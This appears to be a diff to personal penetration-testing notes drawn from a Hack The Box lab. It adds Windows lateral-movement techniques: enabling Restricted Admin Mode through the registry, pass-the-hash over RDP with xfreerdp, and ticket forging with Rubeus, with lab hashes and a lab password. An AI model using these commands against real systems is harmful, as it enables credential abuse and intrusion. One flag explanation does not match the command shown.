@@ -221,6 +221,7 @@ Get-ADObject -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840
 Get-ADObject -LDAPFilter '(objectClass=group)' -Properties * | Measure-Object | Select-Object -ExpandProperty Count
 ```
 
+
 # ACL Abuse
 
 ## Create cred object
@@ -1394,3 +1395,88 @@ sudo hashcat -m 5600 smb_pwd.txt /usr/share/wordlists/rockyou.txt
 ```bash
 sudo hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt
 ```
+
+
+# Windows Lateral Movement
+## Restricted Admin Mode
+Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.
+
+Although this mode prevents the caching of credentials, if enabled, it allows the execution of `Pass the Hash` or `Pass the Ticket` for lateral movement.
+
+To confirm if `Restricted Admin Mode` is enabled, we can query the following registry key:
+```cmd
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
+```
+The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:
+
+- If the value is `0`, `Restricted Admin Mode` is enabled.
+- If the value is `1`, `Restricted Admin Mode` is disabled.
+
+If the key does not exist it means that is disabled.
+
+Additionally, to enable `Restricted Admin Mode`, we would set the `DisableRestrictedAdmin` value to `0`. Here is the command to enable it:
+
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
+```
+
+And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value to `1`:
+
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
+```
+
+## Pass the Hash and Pass the ticket for RDP
+If the `Restricted Admin Mode` is enable we can abuse this to authenticate using **hash** or **ticket**.
+
+To perform `Pass the Hash` from a Linux machine, we can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP. Here's an example command:
+
+```bash
+proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
+[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
+```
+
+For `Pass the Ticket` we can use [Rubeus](https://github.com/GhostPack/Rubeus). We will forge a ticket using `Helen`'s hash. First we need to launch a sacrificial process with the option `createnetonly`:
+
+```powershell
+.\Rubeus.exe createnetonly /program:powershell.exe /show
+```
+
+In the new PowerShell window we will use User's hash to forge a Ticket-Granting ticket (TGT):
+
+```powershell-session
+.\Rubeus.exe asktgt /user:<insert-the-user> /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt
+```
+
+From the powershell session were we have imported the TGT we can use `mstsc /restrictedAdmin`:
+
+```powershell
+C:\Tools> mstsc.exe /restrictedAdmin
+```
+
+It will open a window as the currently logged-in user. **It doesn't matter if the name is not the same as the account we are trying to impersonate.**
+
+![text](https://academy.hackthebox.com/storage/modules/263/mstsc-restrictedadmin.png)
+
+When we click login, it will allow us to connect to RDP using the hash:
+
+![text](https://academy.hackthebox.com/storage/modules/263/mstsc-rdp-with-ticket.png)
+
+# Connection
+
+## XfreeRDP
+
+This xfreerdp connection is optimize for low latency networks or Proxy Connections
+```bash
+xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:16 /compression -themes -wallpaper /clipboard +clipboard /audio-mode:0
+```
+
+in this command:
+
+- `/bpp:8`: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.
+- `/compression`: Enables compression to reduce the amount of data sent over the network.
+- `-themes`: Disables desktop themes to reduce graphical data.
+- `-wallpaper`: Disables the desktop wallpaper to further reduce graphical data.
+- `/clipboard`: Enables clipboard sharing between the local and remote machines.
+- `/audio-mode:0`: Disables audio redirection to save bandwidth.
